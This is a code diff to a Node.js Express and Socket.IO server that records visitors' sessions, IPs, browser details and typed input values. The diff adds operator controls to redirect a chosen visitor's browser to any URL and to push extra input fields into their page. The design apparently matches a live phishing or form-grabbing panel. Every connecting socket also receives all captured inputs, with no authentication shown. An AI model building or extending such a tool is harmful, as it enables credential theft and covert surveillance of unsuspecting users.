@@ -79,7 +79,7 @@ const saveDataToFile = () => {
 };
 
 app.post("/api/track", async (req, res) => {
-  const { sessionId, pageUrl, eventType, inputName, inputValue, componentName } = req.body;
+  const { sessionId, pageUrl, eventType, inputName, inputValue, componentName, browserInfo } = req.body;
   const ip = getClientIp(req);
 
   try {
@@ -108,6 +108,7 @@ app.post("/api/track", async (req, res) => {
       pageUrl,
       eventType,
       componentName,
+      browserInfo, // Add browser information
       inputs: userInputs[sessionId] || {},
       lastActive: new Date(),
       timestamp: new Date()
@@ -120,6 +121,15 @@ app.post("/api/track", async (req, res) => {
       activeUsers.push(user);
     }
 
+    if (eventType === 'page_unload') {
+      const userIndex = activeUsers.findIndex(u => u.sessionId === sessionId);
+      if (userIndex !== -1) {
+        const disconnectedUser = { ...activeUsers[userIndex], disconnectedAt: new Date() };
+        previousUsers.push(disconnectedUser);
+        activeUsers.splice(userIndex, 1);
+      }
+    }
+
     saveDataToFile();
     io.emit("update", { activeUsers, previousUsers });
     res.sendStatus(200);
@@ -129,10 +139,10 @@ app.post("/api/track", async (req, res) => {
   }
 });
 
-// Clean up inactive users (30 seconds timeout)
+// Clean up inactive users (2 minutes timeout)
 setInterval(() => {
-  const thirtySecondsAgo = new Date(Date.now() - 30000);
-  const inactiveUsers = activeUsers.filter(user => new Date(user.lastActive) < thirtySecondsAgo);
+  const twoMinutesAgo = new Date(Date.now() - 120000);
+  const inactiveUsers = activeUsers.filter(user => new Date(user.lastActive) < twoMinutesAgo);
   
   if (inactiveUsers.length > 0) {
     previousUsers = [...previousUsers, ...inactiveUsers.map(user => ({
@@ -142,7 +152,7 @@ setInterval(() => {
     previousUsers = previousUsers.slice(-50); // Keep only last 50 previous users
   }
   
-  activeUsers = activeUsers.filter(user => new Date(user.lastActive) >= thirtySecondsAgo);
+  activeUsers = activeUsers.filter(user => new Date(user.lastActive) >= twoMinutesAgo);
   saveDataToFile();
   io.emit("update", { activeUsers, previousUsers });
 }, 30000);
@@ -245,6 +255,63 @@ app.get("/api/user-sessions", (req, res) => {
   });
 });
 
+app.get("/api/get-input-config/:sessionId", (req, res) => {
+  const { sessionId } = req.params;
+  const inputsConfig = userInputs[sessionId] ? userInputs[sessionId].inputsConfig : null;
+  if (inputsConfig) {
+    res.json({ inputsConfig });
+  } else {
+    res.status(404).json({ error: 'Input configuration not found' });
+  }
+});
+
+let configCheckInterval;
+const configCheckLimit = 5; // Limit the number of calls
+let configCheckCount = 0;
+const failedSessionIds = new Set(); // Track session IDs that have failed
+
+const startConfigCheck = () => {
+  configCheckInterval = setInterval(async () => {
+    if (configCheckCount >= configCheckLimit) {
+      stopConfigCheck();
+      return;
+    }
+
+    for (const sessionId in userInputs) {
+      if (failedSessionIds.has(sessionId)) {
+        continue; // Skip session IDs that have previously failed
+      }
+
+      try {
+        const response = await axios.get(`http://192.168.0.2:8000/api/get-input-config/${sessionId}`);
+        if (response.status === 200) {
+          const inputsConfig = response.data.inputsConfig;
+          io.to(sessionId).emit('configUpdate', { sessionId, inputsConfig });
+        } else {
+          throw new Error('Input configuration not found');
+        }
+      } catch (error) {
+        console.error(`Error fetching input configuration for session ${sessionId}:`, error);
+        if (error.response && error.response.status === 404) {
+          failedSessionIds.add(sessionId); // Add to failed session IDs if 404 error
+        }
+      }
+    }
+
+    configCheckCount++;
+  }, 10000); // Check every 10 seconds
+};
+
+const stopConfigCheck = () => {
+  clearInterval(configCheckInterval);
+  configCheckCount = 0; // Reset the count
+};
+
+const getUserSocketBySessionId = (sessionId) => {
+  const sockets = Array.from(io.sockets.sockets.values());
+  return sockets.find(socket => socket.handshake.auth.sessionId === sessionId);
+};
+
 io.on("connection", (socket) => {
   const sessionId = socket.handshake.auth.sessionId;
   console.log(`Client connected: ${socket.id}, Session: ${sessionId}`);
@@ -252,6 +319,31 @@ io.on("connection", (socket) => {
   socket.sessionId = sessionId;
   
   socket.emit("update", { activeUsers, previousUsers, userInputs });
+
+  socket.on('redirectUser', ({ sessionId, url }) => {
+    const userSocket = getUserSocketBySessionId(sessionId);
+    if (userSocket) {
+      userSocket.emit('redirectUser', { url });
+    }
+  });
+
+  socket.on('addCustomInput', ({ sessionId, input }) => {
+    console.log('Received addCustomInput event:', { sessionId, input });
+    io.emit('addCustomInput', { sessionId, input });
+  });
+
+  socket.on('configureInputs', ({ sessionId, inputsConfig }) => {
+    console.log('Received configureInputs event:', { sessionId, inputsConfig });
+    userInputs[sessionId] = { ...userInputs[sessionId], inputsConfig }; // Merge the configuration
+    io.emit('configureInputs', { sessionId, inputsConfig });
+  });
+
+  socket.on('disconnect', () => {
+    console.log(`Client disconnected: ${socket.id}, Session: ${sessionId}`);
+    stopConfigCheck();
+  });
+
+  startConfigCheck();
 });
 
 // Routes
